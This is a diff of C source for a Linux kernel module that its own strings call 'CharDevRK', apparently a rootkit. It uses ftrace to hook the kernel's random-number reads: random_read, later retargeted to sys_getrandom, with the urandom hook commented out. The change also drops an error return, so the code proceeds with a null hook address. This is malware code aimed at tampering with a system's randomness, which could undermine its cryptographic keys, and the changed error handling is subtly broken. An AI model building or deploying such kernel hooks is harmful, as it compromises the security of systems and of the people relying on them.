@@ -1,4 +1,3 @@
-#include <linux/cred.h>
 #include <linux/ftrace.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
@@ -7,6 +6,7 @@
 #include <linux/syscalls.h>
 #include <linux/version.h>
 
+// Module Signature
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("P3R5157");
 MODULE_DESCRIPTION("PRNG Character Device Hook");
@@ -119,7 +119,6 @@ int initialize_hooks (struct hook_t *hooks, size_t count) {
 		if (!hooks[i].address) {
 			pr_debug("CharDevRK: init_hooks %s address failed.\n", hooks[i].name);
 			errors = -ENOENT;
-			return -ENOENT;
 		}
 
 		*((unsigned long*) hooks[i].original) = hooks[i].address;
@@ -156,8 +155,8 @@ kill:
 	// // // // // //
 
 static struct hook_t hooks[] = {
-	HOOK("random_read", random_read_hook, &real_random_read), 
-	HOOK("urandom_read", urandom_read_hook, &real_urandom_read),
+	HOOK("sys_getrandom", random_read_hook, &real_random_read), 
+//	HOOK("urandom_read_iter", urandom_read_hook, &real_urandom_read),
 };
 
 static int __init prng_hook_init (void) {
